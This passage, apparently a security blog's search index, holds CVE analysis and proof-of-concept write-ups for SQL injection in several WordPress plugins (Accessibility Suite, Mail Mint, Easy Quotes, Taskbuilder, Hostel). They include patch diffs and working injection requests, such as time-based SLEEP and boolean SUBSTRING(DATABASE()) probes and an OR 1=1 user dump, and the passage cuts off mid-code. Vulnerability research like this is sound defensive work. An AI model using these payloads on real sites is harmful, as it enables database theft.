that the SQLi payload works. Alternative techniques for empty tables: UNION — works even when the base query returns no rows, but you must find the correct column count. Subquery: In WHERE clause: MySQL may optimize it away if results are predictable. In FROM clause: The subquery executes first to create a temporary table, ensuring the injected query runs. SQL Execution Order Diagram ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#detecting-the-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Extracting the First Letter of the Database Name\rTo fully dump data, we first confirm that SQLi allows reading at least one character from the database name. Use this payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1) The query uses SUBSTRING() to extract the first character of the database name. If it equals 'w' (0x77 in hex), it triggers SLEEP(5). Since scan_id is escaped, hex encoding ensures payload integrity. 👉 Based on the delayed response — the first character is indeed w. ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#extracting-the-first-letter-of-the-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability CVE-2025-32650 in the Accessibility Suite WordPress plugin (before version 4.19) stems from improper use of $wpdb-\u003eprepare(), leading to a SQL Injection. The official patch correctly uses $wpdb-\u003eprepare(), ensuring safe handling of user input. Key takeaways: Always use $wpdb-\u003eprepare() correctly when interacting with the WordPress database. Keep plugins updated and perform regular security audits to prevent exploitation. ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection Cheat Sheet – PortSwigger WordPress Accessibility Suite Plugin \u003c= 4.18 is vulnerable to SQL Injection ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Mail Mint Plugin.","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability occurs in the Mail Mint plugin for WordPress prior to version 1.18.6. This flaw allows attackers to directly interact with the database — potentially leading to information disclosure or data theft. CVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.18.5 CVSS Severity: Low (7.6) Required Privilege: Administrator ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Mail Mint: v1.18.5 (vulnerable) and v1.18.6 (patched) Diff tool: meld or any comparison tool to visualize the code difference between versions ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe vulnerable function directly inserts user input into an SQL query without using proper sanitization or query preparation, leading to an SQL Injection vulnerability. ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rUse any diff tool to compare the vulnerable and patched versions. There is a clear difference in the file /app/Utilities/Helper/Import.php. public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"')\"; $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \"SELECT user_id FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"') GROUP BY user_id LIMIT $number OFFSET $offset\"; $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } The patch replaces direct string concatenation with the safer $wpdb-\u003eprepare() method. public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u003eprepare( \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders)\", $keys ); $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026 OFFSET (safe with prepare) $final_query = $wpdb-\u003eprepare( \"SELECT user_id FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\", array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } Patch Diff ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How It Works\rThe vulnerability resides in the function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) inside the Import class. To trace its usage, search for the keyword get_wp_users_by_learndash_with_limit_offset in the plugin directory. Search Import The function is called inside: retrieve_contacts_associated_with_learndash() perform_learndash_user_import() These functions belong to the ContactImportAction class in /app/API/Actions/Admin/Contact/ContactImportAction.php. Next, searching for retrieve_contacts_associated_with_learndash reveals it is used inside another method: Search 1 This function is invoked by map_contacts_with_learndash() in the ContactImportController class located in /app/API/Controllers/Admin/Contact/ContactImportController.php. Further tracing map_contacts_with_learndash shows it is registered as a REST API callback: Search 2 class ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u003enamespace, // mrm/v1 $this-\u003erest_base . '/learndash/map', // contacts/import/learndash/map/ array( array( 'methods' =\u003e WP_REST_Server::CREATABLE, // POST 'callback' =\u003e array( $this-\u003econtroller, 'map_contacts_with_learndash' ), 'permission_callback' =\u003e PermissionManager::current_user_can('mint_manage_contacts'), // Admin 'args' =\u003e array( 'selectedCourses' =\u003e array( 'description' =\u003e __( 'The selected courses from which to import contacts.', 'mrm' ), 'required' =\u003e true, 'type' =\u003e 'array', 'sanitize_callback' =\u003e 'rest_sanitize_array', ) ), // array + required ), ) ); // other logic } // other logic } Call flow: A POST request is made to /wp-json/mrm/v1/contacts/import/learndash/map with the required parameter selectedCourses. The callback map_contacts_with_learndash(WP_REST_Request $request) receives the request. The $request object is converted to an array $params. The callback then calls retrieve_contacts_associated_with_learndash($params). That function finally calls get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) where: $courses = $params['selectedCourses'] $keys is an array built from all value fields in $courses, concatenated like course_{COURSE_ID}_access_from. Before being inserted into the SQL query, the $keys array is merged into a string using implode(). The query is executed and returns a JSON response with formatted_users and total_users. ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\rAfter analyzing the code, it’s clear that the selectedCourses parameter undergoes several transformations before being injected into the vulnerable SQL query — but the attacker still controls the value key. POST request using BurpSuite: A single key can be used to easily control the final SQL query. Get all user info The resulting query looks like this: SELECT user_id FROM wp_usermeta WHERE meta_key IN ('course_abc') OR 1=1 -- _access_from') GROUP BY user_id LIMIT 5 OFFSET 0 ') escapes the IN clause 1=1 is always true → returns all user IDs from wp_usermeta The rest of the function retrieves metadata for all returned users: $formatted_users = array_map( function ($user) { $user-\u003eusermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u003eID) ); return $user; }, $contacts ); ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-58604 vulnerability in the WordPress Mail Mint plugin (prior to version 1.18.6) originates from not using $wpdb-\u003eprepare() when executing SQL queries. Instead, user input was directly concatenated into the SQL statement — leading to a classic SQL Injection vulnerability. The patch now uses $wpdb-\u003eprepare() to safely construct SQL queries and mitigate this issue. Key takeaways: Always use $wpdb-\u003eprepare() when interacting with the WordPress database to prevent SQL Injection. Regularly update your plugins and perform security reviews to avoid exploitation. ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection Cheat Sheet - PortSwigger WordPress Mail Mint Plugin \u003c= 1.18.5 is Vulnerable to SQL Injection ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Easy Quotes Plugin.","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analysis"],"collections":null,"content":"A vulnerability exists in the Easy Quotes WordPress plugin prior to version 1.2.3. This can allow an attacker to interact directly with your database, including but not limited to data exfiltration. CVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Easy Quotes Plugin: v1.2.2 (vulnerable) and v1.2.3 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe application injects user-supplied data directly into an SQL query without appropriate protections, which leads to SQL Injection. ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rUse any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file includes/quotes-data.php: private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } The patch uses $wpdb-\u003eprepare() instead of concatenating user-supplied data directly into the query: private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; $sql = $wpdb-\u003eprepare( \"SELECT * FROM %i WHERE `family` = %s\", $tablename, $family ); return $wpdb-\u003eget_row($sql); } Patch diff Many other functions were patched the same way, such as get_font_variant($family_id, $variant_id), get_font_variants($family), and get_fonts($category = -1). Although get_fonts_categories() was also updated, it does not accept user input and is thus not relevant to the SQLi issue: public static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-categories'; $sql = $wpdb-\u003eprepare( \"SELECT `category_id`, `category` FROM %i\", $tablename ); return $wpdb-\u003eget_results($sql); } ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rWe exploit the SQL Injection in the function get_family_data($family), and other functions are vulnerable in a similar manner. get_family_data() is a private function in the Quotes_Data class (the example below shows context): class Quotes_Data { function __construct() { add_filter('posts_where', array($this, 'posts_where'), 10, 2); } // other functions public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } } get_family_data() is called by get_family() and get_font_variants(); to find where these are used, search for get_family or get_font_variants. Search function The get_font_variants() function is invoked by rest_route_callback_font_variants() in the Quotes_Rest_Route class: class Quotes_Rest_Route { function __construct() { add_action('rest_api_init', array($this, 'rest_api_init')); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ 'method' =\u003e WP_REST_Server::READABLE, 'callback' =\u003e [$this, 'rest_route_callback_quote'], 'permission_callback' =\u003e '__return_true' ]; register_rest_route('layart/v1', '/quote', $args); // other logic $args['callback'] = [$this, 'rest_route_callback_font_variants']; register_rest_route('layart/v1', '/font-variants', $args); } // other functions function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u003eget_param('family'); $family = isset($family) ? $family : \"Shadows Into Light\"; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } The constructor of Quotes_Rest_Route uses add_action('rest_api_init', ...) to register endpoints with WordPress’s REST API system. The callback rest_route_callback_font_variants corresponds to the endpoint /wp-json/layart/v1/font-variants?family=family_name. If the family parameter is not provided, it defaults to Shadows Into Light. ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detecting SQLi\rWe use a Boolean-based SQL Injection technique to test whether the family parameter is injectable. True request (example): When the injected condition evaluates to true, the query returns normally: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto' AND '1'='1'; False request (example): When the injected condition is false, no results are returned: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto' AND '1'='2'; ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#detecting-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name\rA prerequisite to dumping data is being able to extract a single character of the database name; once you can obtain one character, you can typically extract the rest. In my test environment the database name is wordpress, so the first character is w. First letter A payload checking SUBSTRING(DATABASE(),1,1)='w' returns data normally, confirming the first letter is w: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto' AND SUBSTRING(DATABASE(),1,1)='w'; ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability CVE-2025-26943 in the WordPress Easy Quotes plugin (versions prior to 1.2.3) is caused by concatenating user-supplied input directly into SQL queries instead of using prepared statements ($wpdb-\u003eprepare), which results in SQL Injection. The official patch replaces string concatenation with $wpdb-\u003eprepare, ensuring user input is safely handled. Key takeaways: Always use $wpdb-\u003eprepare() when interacting with the database in WordPress to prevent SQL Injection. Regularly update plugins and perform security checks to avoid becoming an attack target. ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Easy Quotes Plugin \u003c= 1.2.2 is vulnerable to SQL Injection ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Taskbuilder Plugin.","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information. CVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability. ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rUse any diff tool to compare differences between the vulnerable version and the patched version. The clear difference is in the file includes/admin/projects/get_users.php. In version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = $proj_id\" ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = '$proj_id'\" ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection. Patch diff\r","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How It Works\rFile Architecture: General structure of the current file: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row(\"SELECT * FROM {$wpdb-\u003eprefix}wppm_project WHERE id = $proj_id\"); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ 'body' =\u003e $body, 'footer' =\u003e $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it’s called from another feature. To find where it’s used, search for get_users.php in the plugin directory. Search get users\r👉 It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook. WPPM_Admin constructor: final class WPPM_Admin { public function __construct() { // other actions add_action( 'wp_ajax_wppm_get_users', array($this,'wppm_get_users')); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook. wp_ajax_wppm_get_users is an Ajax hook name: wp_ajax_{action} → handles Ajax for logged-in users. wp_ajax_nopriv_{action} → handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users(). 👉 Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin. Ajax search\rThe wppm_get_users action is the data part in the POST request handled by wppm_get_users(). The function is referenced in HTML attributes of the project feature: Create a new project Access that project Inspect code to locate wppm_get_users and see which actions call it Ajax inspect\r👉 Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML. Model display\r","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect SQLi\rCapture requests using BurpSuite and send a time-based SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+SLEEP(1)) Sqli success\rResponse delay indicates a successful SQL Injection. ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#detect-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name\rTo dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped. Send a boolean-based SQLi payload with the correct proj_id: POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77). SUBSTRING(STRING,1,1) retrieves the first character. Here, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users. Res 1\rUsing HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used. Send a boolean-based SQLi payload with a wrong proj_id: POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None. Res 2\r👉 We successfully retrieved the first character of the database name using boolean-based SQLi: Correct proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow. ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax. The patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL. Key Takeaways: Prefer prepared statements ($wpdb-\u003eprepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection Cheat Sheet - PortSwigger WordPress Taskbuilder \u003c= 4.0.1 Vulnerable to SQL Injection ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analysis"],"collections":null,"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration. CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient. ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rUse any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php Vulnerable version: if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } Patched version: if(!empty($_GET['ob'])) { $ob = sanitize_text_field($_GET['ob']); if(!in_array($ob, ['tB.id', 'tB.contact_name', 'tB.contact_email', 'tB.from_date', 'tB.amount_paid', 'tB.status'])) { $ob = 'tB.id'; } $orderby = \"ORDER BY $ob $dir\"; } 👉 The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'. Analysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context. ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rTo inject, we need to identify the complete query used here: $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); The query resides in the default branch of the switch structure. All this logic belongs to the static manage() method of the WPHostelBookings class. class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { case 'add': // add handle break; case 'edit': // edit handle break; // view/print booking details. Will allow also to confirm/cancel case 